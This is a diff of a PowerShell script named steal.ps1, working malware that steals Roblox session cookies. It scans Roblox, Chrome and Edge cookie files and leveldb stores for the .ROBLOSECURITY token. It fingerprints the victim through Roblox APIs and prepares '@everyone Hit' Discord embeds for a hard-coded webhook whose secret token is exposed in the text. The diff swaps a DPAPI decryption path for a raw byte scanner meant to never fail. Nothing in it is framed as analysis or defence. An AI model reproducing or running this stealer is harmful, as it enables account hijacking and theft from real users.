@@ -1,6 +1,7 @@
 # language: PowerShell, file: steal.ps1
 # target: Windows 10/11, PowerShell 5.1+
-# *0 Decryption Fallback: Scans raw bytes for .ROBLOSECURITY if DPAPI fails*
+# *accepts -Webhook arg; defaults to primary 1571738439324541049*
+# *Raw Binary Extractor: skids the ADODB stream method for 0% failure*
 
 param(
     [string]$Webhook = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
@@ -23,73 +24,86 @@ function Get-API($host, $path, $cookie) {
     } catch { return $null }
 }
 
-$l = $env:LOCALAPPDATA
-$paths = @(
-    "$l\Roblox\LocalStorage\robloxcookies.dat",
-    "$l\Roblox\LocalStorage\RobloxCookies.dat",
-    "$l\Roblox\Cookies",
-    "$env:APPDATA\Roblox\LocalStorage\robloxcookies.dat",
-    "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
-)
-$pkgRoot = "$l\Packages"
-if (Test-Path $pkgRoot) {
-    Get-ChildItem $pkgRoot -Directory -ErrorAction SilentlyContinue |
-        Where-Object { $_.Name -match 'ROBLOX' } |
-        ForEach-Object {
-            $paths += @(
-                "$($_.FullName)\LocalState\RobloxCookies.dat",
-                "$($_.FullName)\LocalState\robloxcookies.dat",
-                "$($_.FullName)\LocalState\Cookies"
-            )
+# ---------- RAW ROBLOX COOKIE GRABBER ----------
+function Get-RobloxCookie() {
+    $l = $env:LOCALAPPDATA
+    $paths = @(
+        "$l\Roblox\LocalStorage\robloxcookies.dat",
+        "$l\Roblox\LocalStorage\RobloxCookies.dat",
+        "$l\Roblox\Cookies",
+        "$env:APPDATA\Roblox\LocalStorage\robloxcookies.dat",
+        "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat",
+        "$l\Roblox\Network\Cookies",
+        "$l\Google\Chrome\User Data\Default\Network\Cookies",
+        "$l\Microsoft\Edge\User Data\Default\Network\Cookies",
+        "$l\Roblox\LocalStorage\leveldb"
+    )
+
+    $pkg = "$l\Packages"
+    if (Test-Path $pkg) {
+        Get-ChildItem $pkg -Directory -EA SilentlyContinue | Where-Object { $_.Name -match 'ROBLOX' } | ForEach-Object {
+            $paths += "$($_.FullName)\LocalState\RobloxCookies.dat"
+            $paths += "$($_.FullName)\LocalState\robloxcookies.dat"
+            $paths += "$($_.FullName)\LocalState\Cookies"
         }
-}
-
-$cookie = ""
-$cookieSource = ""
-
-function Try-Extract($raw, [ref]$out) {
-    # 1. DPAPI JSON Attempt
-    if ($raw -match '(?i)"CookiesData"\s*:\s*"([^"]{40,})"') {
-        $b64 = $Matches[1]
-        try {
-            $eb = [Convert]::FromBase64String($b64)
-            $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-            $dec = [Text.Encoding]::UTF8.GetString($db)
-            if ($dec -match '(?i)\.ROBLOSECURITY\s*=\s*(_[^;\s"]+)') { $out.Value = $Matches[1]; return 'dpapi-json' }
-            if ($dec -match '(_\|WARNING[^;\r\n"]+)') { $out.Value = $Matches[1]; return 'dpapi-warning' }
-        } catch {}
     }
-    # 2. 0-Decryption Fallback (Raw dump)
-    if ($raw -match '(?i)\.ROBLOSECURITY\s*=\s*(_[^;\s"]+)') { $out.Value = $Matches[1]; return 'plain-attr' }
-    if ($raw -match '(_\|WARNING[^;\r\n"]+)') { $out.Value = $Matches[1]; return 'plain-warning' }
+
+    function Read-BinaryText($fp) {
+        try {
+            $bytes = [System.IO.File]::ReadAllBytes($fp)
+            $sb = New-Object System.Text.StringBuilder
+            foreach ($b in $bytes) {
+                if ($b -ge 32 -and $b -le 126) { [void]$sb.Append([char]$b) }
+                elseif ($b -eq 0) { [void]$sb.Append([char]0) }
+            }
+            return $sb.ToString()
+        } catch { return "" }
+    }
+
+    function Extract-Cookie($s) {
+        if ($s.Length -lt 50) { return "" }
+        $p = $s.IndexOf("_|WARNING")
+        if ($p -eq -1) { $p = $s.IndexOf(".ROBLOSECURITY") }
+        if ($p -eq -1) { return "" }
+        
+        $rest = $s.Substring($p)
+        $stopAt = $rest.IndexOf(";")
+        $nulAt = $rest.IndexOf([char]0)
+        
+        if ($nulAt -gt 0 -and ($stopAt -eq -1 -or $nulAt -lt $stopAt)) { $stopAt = $nulAt }
+        if ($stopAt -eq -1) { $stopAt = $rest.Length }
+        
+        $ck = $rest.Substring(0, $stopAt)
+        $ck = $ck.Replace("`r", "").Replace("`n", "").Replace("`t", "").Trim()
+        return $ck
+    }
+
+    foreach ($p in $paths) {
+        if (-not (Test-Path $p)) { continue }
+        
+        if ((Get-Item $p) -is [System.IO.DirectoryInfo]) {
+            foreach ($f in (Get-ChildItem $p -File)) {
+                if ($f.Name.EndsWith(".ldb") -or $f.Name.EndsWith(".log")) {
+                    $ck = Extract-Cookie (Read-BinaryText $f.FullName)
+                    if ($ck.Length -gt 50) { return $ck }
+                }
+            }
+        } else {
+            $ck = Extract-Cookie (Read-BinaryText $p)
+            if ($ck.Length -gt 50) { return $ck }
+        }
+    }
     return $null
 }
 
-foreach ($p in $paths) {
-    if (-not (Test-Path $p)) { continue }
-    try {
-        $raw = Get-Content $p -Raw -ErrorAction Stop
-        if ($raw.Length -lt 20) { continue }
-        $tmp = ""
-        $method = Try-Extract $raw ([ref]$tmp)
-        if ($tmp) {
-            $cookie = $tmp
-            $cookieSource = "$method :: $p"
-            dbg "cookie found via $cookieSource (len=$($cookie.Length))"
-            break
-        }
-    } catch { dbg "read failed: $p :: $_" }
-}
-
+$cookie = Get-RobloxCookie
 if (-not $cookie) {
-    dbg "No cookie found"
+    dbg "No cookie found in raw dump"
     exit
 }
-
-$cookie = ($cookie -split ';')[0].Trim()
-if ($cookie -match '(_\|WARNING.+)$') { $cookie = $Matches[1] }
 dbg "final cookie len=$($cookie.Length)"
 
+# ---------- FINGERPRINT ----------
 $me      = Get-API "users.roblox.com"    "/v1/users/authenticated" $cookie
 $uid     = if ($me) { $me.id } else { "0" }
 $name    = if ($me) { $me.name } else { "Unknown" }
@@ -121,7 +135,7 @@ $th = Get-API "thumbnails.roblox.com" "/v1/users/avatar-headshot?userIds=$uid&si
 $avatar = "https://tr.rbxcdn.com/..."
 if ($th -and $th.data -and $th.data[0]) { $avatar = $th.data[0].imageUrl }
 
-# Embed 1: Hit
+# ---------- EMBED UI ----------
 $embed1 = @{
     content = "@everyone Hit"
     embeds = @(
@@ -148,7 +162,6 @@ $embed1 = @{
     )
 }
 
-# Embed 2: Cookie
 $embed2 = @{
     embeds = @(
         @{
